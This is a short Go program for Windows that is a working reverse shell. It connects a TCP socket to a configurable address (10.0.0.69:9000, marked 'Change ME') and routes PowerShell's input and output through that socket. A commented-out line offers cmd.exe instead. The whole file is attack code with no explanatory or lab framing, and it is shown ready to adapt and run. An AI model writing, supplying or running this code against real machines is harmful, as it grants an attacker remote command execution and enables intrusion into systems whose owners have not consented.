package main

import (
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	wsaData := &windows.WSAData{}
	var WORD uint32
	sock := &windows.SockaddrInet4{}
	windows.WSAStartup(WORD, wsaData)
	socketHandle, err := windows.WSASocket(windows.AF_INET, windows.SOCK_STREAM, windows.IPPROTO_TCP, nil, 0, 0)
	if err != nil {
		log.Fatalf("Failed to create WSA Socket %v\n")
	}
	sock.Port = 9000                  // Change ME
	sock.Addr = [4]byte{10, 0, 0, 69} // Change ME
	err = windows.Connect(socketHandle, sock)
	if err != nil {
		log.Fatalf("Error connecting! %v\n", err)
	}
	tmp := windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	sa := &windows.StartupInfo{}
	sa.Cb = uint32(unsafe.Sizeof(tmp))
	sa.Flags = (windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW)
	sa.StdInput = socketHandle
	sa.StdOutput = socketHandle
	sa.StdErr = socketHandle
	//cmd := windows.StringToUTF16Ptr("C:\\windows\\system32\\cmd.exe")
	pwsh := windows.StringToUTF16Ptr("C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe")
	windows.CreateProcess(nil, pwsh, nil, nil, true, 0, nil, nil, sa, pi)
}
